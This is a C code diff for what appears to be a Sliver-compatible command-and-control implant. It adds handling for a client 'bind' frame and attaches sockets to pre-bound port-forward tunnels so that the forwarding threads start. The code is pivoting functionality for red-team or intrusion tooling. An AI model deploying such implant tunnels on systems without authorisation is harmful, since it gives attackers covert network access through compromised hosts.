@@ -125,6 +125,29 @@ static void forward_thread(void *arg) {
   (void)forward_send_data(f, NULL, 0, 1);
 }
 
+/* The client creates the tunnel server-side and binds it by sending a zero byte
+ * TunnelData before the PortfwdReq arrives. We must acknowledge that frame, or
+ * the client waits for "bound" until it times out. */
+int sliver_portfwd_bind(uint64_t id) {
+  portfwd_t *f;
+
+  if (forward_find(id) != NULL) {
+    return 1;
+  }
+  for (size_t i = 0; i < SLIVER_MAX_PORTFWDS; ++i) {
+    if (!g_forwards[i].used) {
+      f = &g_forwards[i];
+      memset(f, 0, sizeof(*f));
+      f->used = 1;
+      f->id = id;
+      f->lock = sliver_mutex_create();
+      forward_ack(f);
+      return 1;
+    }
+  }
+  return 0;
+}
+
 int sliver_rpc_handle_portfwd(const sliver_envelope_t *req, sliver_buf_t *out) {
   sliver_reader_t r;
   uint32_t field, wire;
@@ -169,6 +192,19 @@ int sliver_rpc_handle_portfwd(const sliver_envelope_t *req, sliver_buf_t *out) {
   }
   sliver_socket_set_recv_timeout(sock, SLIVER_PORTFWD_POLL_MS);
   id = tunnel_id;
+  f = forward_find(id);
+  if (f != NULL) {
+    /* Bound earlier by the client bind frame: attach the socket. */
+    f->sock = sock;
+    if (f->lock == NULL) {
+      f->lock = sliver_mutex_create();
+    }
+    if (sliver_thread_create(forward_thread, f) == NULL) {
+      forward_release(f);
+      return -1;
+    }
+    goto respond;
+  }
   for (size_t i = 0; i < SLIVER_MAX_PORTFWDS; ++i) {
     if (!g_forwards[i].used) {
       f = &g_forwards[i];
@@ -189,6 +225,7 @@ int sliver_rpc_handle_portfwd(const sliver_envelope_t *req, sliver_buf_t *out) {
     forward_release(f);
     return -1;
   }
+respond:
   /* Portfwd{Host=3, Port=1, TunnelID=8, Response=9}. */
   if (sliver_buf_put_string(out, 3, host) != 0 || sliver_buf_put_uint32(out, 1, port) != 0 ||
       sliver_buf_put_uint64(out, 8, id) != 0) {
@@ -228,3 +265,4 @@ int sliver_portfwd_tunnel_close(uint64_t tunnel_id) {
   forward_release(f);
   return 1;
 }
+
